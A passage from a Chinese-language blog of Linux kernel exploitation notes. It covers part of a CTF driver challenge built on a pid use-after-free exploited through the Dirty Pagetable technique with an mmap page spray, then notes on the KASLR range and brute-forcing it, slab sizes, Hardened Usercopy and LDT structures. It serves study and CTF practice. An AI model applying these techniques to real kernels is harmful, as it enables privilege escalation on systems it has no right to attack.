class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( show_cnt )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(a3, &amp;nr, <span class="number">4LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_259);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      --show_cnt;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供了三个各只能使用一次的功能</p><p>kernel_clone就相当于是一个fork函数</p><p>漏洞出在<strong>0x69003</strong>功能中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dest_cnt )</span><br><span class="line">&#123;</span><br><span class="line">  --dest_cnt;</span><br><span class="line">  put_pid(pid);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放了pid但是没有释放该进程</p><p>题目给出提示：Dirty Pagetable</p><p>Dirty PageTable 是一种针对堆相关漏洞的利用手法，主要就是针对 PTE 进行攻击</p><p>在 x86-64 Linux 中，通常使用 4 级页表将虚拟地址转换为物理地址</p><ul><li>Dirty Pagetable 以 PTE（页表条目）为目标，这是物理内存之前的最后一个级别</li><li>在 Linux 中，当需要新的 PTE 时，PTE 的页面也会使用 Buddy 系统进行分配</li></ul><p>victim pid 对象的计数字段与有效的 PTE 重合</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">refcount_t</span> count; <span class="comment">/* 指向该数据结构的引用次数 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> level;</span><br><span class="line"><span class="type">spinlock_t</span> lock;</span><br><span class="line"><span class="comment">/* lists of tasks that use this pid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">inodes</span>;</span></span><br><span class="line"><span class="comment">/* wait queue for pidfd notifications */</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> wait_pidfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>count 字段是 pid 对象的第一个字段（8 字节对齐），尽管 count 字段大小为 4 个字节，但它恰好与 PTE 的较低 4 字节重合，因此我们可以通过计数器来修改 PTE</li><li>由于进程中的 fd 资源有限，它最多只能添加 32768 进行计数，为了打破这个限制，我们可以利用 fork 在多个进程中执行增量原语，此操作允许我们向受害者 PTE 添加足够大的数字</li></ul><p>我们可以通过 mmap 来快速分配大量页表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">    page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                         <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                         MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; N_PAGESPRAY; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">        *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br></pre></td></tr></table></figure><ul><li>Linux 内核是惰性的，当 mmap 创建内存时并不会为其绑定页表，只有在第一次读写时才会通过缺页处理来进行绑定</li></ul><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="kaslr的随机化范围"><a href="#kaslr的随机化范围" class="headerlink" title="kaslr的随机化范围"></a>kaslr的随机化范围</h2><p>在qemu模拟中这个选项是默认打开的</p><p>kaslr在kernel text部分随机化范围是9位</p><p>其在不开启kaslr的情况下,默认是在<code>0xffffffff81000000</code>(虽然官方文档是<code>0xffffffff80000000</code>)</p><p>在开启kaslr后其随机化的9位,还不是很清楚到底是哪几位,不过在多次调试后大致可以判断</p><p>是<code>810</code>即<code>1000 0001 0000</code>这12位中的前两位中四位后三位</p><p>所以kaslr的范围是<code>FFFF FFFF 8100 0000--FFFF FFFF BFE0 0000</code></p><p>这是一个可接受的范围,爆破一下也不是不行</p><p>至于内核其他部分不确定,也没有去调试,不过大致判断也差不多</p><h2 id="slab分配最小大小"><a href="#slab分配最小大小" class="headerlink" title="slab分配最小大小"></a>slab分配最小大小</h2><p>在<code>include/linux/slab.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc array related definitions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">(MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAXKMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLUB directly allocates requests fitting in to an order-1 page</span></span><br><span class="line"><span class="comment"> * (PAGE_SIZE*2).  Larger requests are passed to the page allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH(PAGE_SHIFT + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLOB passes all requests larger than one page to the page allocator.</span></span><br><span class="line"><span class="comment"> * No kmalloc array is necessary since objects of different sizes can</span></span><br><span class="line"><span class="comment"> * be allocated from the same page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGHPAGE_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum allocatable size */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_MAX)</span></span><br><span class="line"><span class="comment">/* Maximum size for which we actually use a slab cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_CACHE_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)</span></span><br><span class="line"><span class="comment">/* Maximum order allocatable via the slab allocagtor */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_ORDER(KMALLOC_SHIFT_MAX - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This restriction comes from byte sized index implementation.</span></span><br><span class="line"><span class="comment"> * Page size is normally 2^12 bytes and, in this case, if we want to use</span></span><br><span class="line"><span class="comment"> * byte sized index which can represent 2^8 entries, the size of the object</span></span><br><span class="line"><span class="comment"> * should be equal or greater to 2^12 / 2^8 = 2^4 = 16.</span></span><br><span class="line"><span class="comment"> * If minimum size of kmalloc is less than 16, we use it as minimum object</span></span><br><span class="line"><span class="comment"> * size and give up to use byte sized index.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_OBJ_MIN_SIZE      (KMALLOC_MIN_SIZE &lt; 16 ? \</span></span><br><span class="line"><span class="meta">                               (KMALLOC_MIN_SIZE) : 16)</span></span><br></pre></td></tr></table></figure><p>可以看到slub和slob的最小obj大小都是8</p><p>slab的最小obj大小则是32</p><h2 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h2><p>在开启该保护后,针对<code>copy_from_user</code>和<code>copy_to_user</code>两个函数会多出不少检查</p><p><code>copy_from_user</code>有如下检查</p><ul><li>目标地址是否合法</li><li>目标地址是否在堆中</li><li>目标地址是否为slab中的object</li><li>目标地址是否非内核.text段内地址</li></ul><p><code>copy_to_user</code>有如下检查</p><ul><li>源地址是否非内核.text段内地址</li></ul><h2 id="ldt"><a href="#ldt" class="headerlink" title="ldt"></a>ldt</h2><p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p><p>entries指向一个数组</p><p>nr_entries记录着数组的数量</p><p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> desc_struct结构体 </summary>              <div class='content'>              <p><strong>高 32 位</strong></p><div class="table-container"><table><thead><tr><th style="text-align:center">31~24</th><th style="text-align:center">23</th><th style="text-align:center">22</th><th style="text-align:center">21</th><th style="text-align:center">20</th><th style="text-align:center">19~16</th><th style="text-align:center">15</th><th style="text-align:center">14~13</th><th style="text-align:center">12</th><th style="text-align:center">11~8</th><th style="text-align:center">7~0</th></tr></thead><tbody><tr><td style="text-align:center">段基址的 31~24 位</td><td style="text-align:center">G</td><td style="text-align:center">D/B</td><td style="text-align:center">L</td><td style="text-align:center">AVL</td><td style="text-align:center">段界限的 19 ~16 位</td><td style="text-align:center">P</td><td style="text-align:center">DPL</td><td style="text-align:center">S</td><td style="text-align:center">TYPE</td><td style="text-align:center">段基址的 23~16 位</td></tr></tbody></table></div><ul><li>G (ranularity)：段粒度大小，4 KB（1） / 1B （0）</li><li>D/B：对代码段而言为D位，对数据段而言为B位；该位为1表示有效操作数为32位，0则为16位</li><li>L：是否为64位段描述符，1为是</li><li>AVL：available位，暂且无用</li><li>P：即 present，用以标识该段在内存中是否存在，1为存在</li><li>DPL：Descriptor Priviledge Level，即特权级别，00 对应 ring 0，11 对应 ring 3</li><li>S：是否为<strong>系统段</strong>，0表示系统段，1表示非系统段</li><li>TYPE：段类型</li></ul><p>其中，对于段的 TYPE 字段说明如下（下表摘自《操作系统真象还原》）：</p><ul><li>系统段</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">3</th><th style="text-align:center">2</th><th style="text-align:center">1</th><th style="text-align:center">0</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">未定义</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">可用的 80286 TSS</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286 的任务状态段</td></tr><tr><td style="text-align:center">LDT</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">局部描述符表</td></tr><tr><td style="text-align:center">忙碌的 80286 TSS</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286， 其中第一位由CPU设置</td></tr><tr><td style="text-align:center">80286 调用门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">任务门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">在现在操作系统中已很少用到</td></tr><tr><td style="text-align:center">80286 中断门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">80286 陷阱门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">可用的 80386 TSS</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的 TSS</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">忙碌的 80386 TSS</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的 TSS，第一位由CPU设置</td></tr><tr><td style="text-align:center">80386 调用门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">386 以上 CPU 的调用门</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">中断门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">386 以上 CPU 的中断门</td></tr><tr><td style="text-align:center">陷阱门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的陷阱门</td></tr></tbody></table></div><ul><li>非系统段</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">X</th><th style="text-align:center">C</th><th style="text-align:center">R</th><th style="text-align:center">A</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">代码段</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只执行代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可执行、可读代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">可执行、一致性代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读、可执行、一致性代码段</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">X</th><th style="text-align:center">E</th><th style="text-align:center">W</th><th style="text-align:center">A</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">数据段</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只读数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读写数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只读、向下扩展数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读写、向下扩展数据段</td></tr></tbody></table></div><p>通常情况下数据段向高地址增长，对于标识了E（xtend）位的数据段则向低地址增长（比如说栈段就是这样一个数据段）</p><p><strong>低 32 位</strong></p><div class="table-container"><table><thead><tr><th style="text-align:center">31~16</th><th style="text-align:center">15~0</th></tr></thead><tbody><tr><td style="text-align:center">段基址的 15~0 位</td><td style="text-align:center">段界限的 15~0 位</td></tr></tbody></table></div><p>段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">段基址 + （段粒度大小 x （段界限+1）） - 1</span><br></pre></td></tr></table></figure>              </div>            </details><p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> 